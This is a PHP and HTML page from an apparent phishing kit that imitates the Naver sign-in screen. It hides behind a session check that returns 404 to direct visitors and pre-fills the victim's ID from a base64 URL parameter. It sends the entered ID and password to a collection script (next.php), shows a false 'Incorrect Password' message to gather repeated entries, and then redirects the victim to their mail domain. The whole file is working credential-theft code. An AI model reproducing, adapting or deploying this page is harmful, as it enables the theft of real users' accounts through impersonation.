<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Naver Sign in</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body>
    <div id="maincnaver" class="c-div" style="height: 100vh;padding-top: 39px;padding-bottom: 39px;">
        <div id="formcnaver" style="width: 100%;max-width: 380px;">
            <div id="naverlg" class="c-div"><img class="img-fluid" width="408" height="86" src="../assets/img/naverlg.png" style="width: 130px;"></div>
            <div id="fffouternaver" style="border-radius: 15px;border: 1px solid rgb(191,191,191);margin-top: 38px;">
                <div class="sp-div" style="height: 60px;border-bottom: 1px solid rgb(205,205,205) ;">
                    <div style="width: 50%;border-top-left-radius: 15px;border-top-right-radius: 15px;">
                        <p style="text-align: center;margin-bottom: 0px;margin-top: 18px;">ID/Phone number</p>
                    </div>
                    <div style="width: 50%;background: #dcdcdc;border-top-left-radius: 15px;border-top-right-radius: 15px;">
                        <p style="text-align: center;margin-bottom: 0px;margin-top: 18px;">QR Code</p>
                    </div>
                </div>
                <div id="foutnaver" style="height: fit-content;padding: 0px 24px;padding-top: 39px;padding-bottom: 36px;border-width: 1px;border-color: rgb(211,211,211);"><input type="text" id="backEMF" style="width: 100%;height: 45px;padding: 1px 12px;margin-top: 16px;font-size: 14px;border: 1px solid rgb(232,232,232);border-top-left-radius: 8px;border-top-right-radius: 8px;" placeholder="ID, or Phone Number"><input type="password" id="pass" style="width: 100%;height: 45px;padding: 1px 12px;font-size: 14px;border: 1px solid rgb(232,232,232);border-bottom-left-radius: 8px;border-bottom-right-radius: 8px;" placeholder="Password">
                    <p id="err" style="margin-top: 16px;color: rgb(251,0,0);">Incorrect Password, Please try again.</p>
                    <div class="form-check" style="margin-top: 8px;"><input class="form-check-input" type="checkbox" id="formCheck-1"><label class="form-check-label" for="formCheck-1" style="font-size: 12px;">Stay Signed in</label></div><button class="btn btn-primary" id="next-btn" type="button" style="margin-top: 12px;width: 100%;border-style: none;border-radius: 6px;background: #09aa5c;color: rgb(255,255,255);height: 40px;" onclick="nextFun();">Log in</button>
                    <hr><button class="btn btn-primary" type="button" style="margin-top: 0px;width: 100%;border-radius: 6px;background: #f0f0f0;color: #09aa5c;height: 40px;border: 1px solid #09aa5c;">Sign in with a passkey</button>
                </div>
            </div>
            <div class="sp-div" style="margin-top: 10px;"><a href="#" style="color: rgb(101,101,101);text-decoration:  underline;">&nbsp;Forgot your Password or ID?</a><a href="#" style="color: rgb(101,101,101);text-decoration:  underline;"> Sign up </a></div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>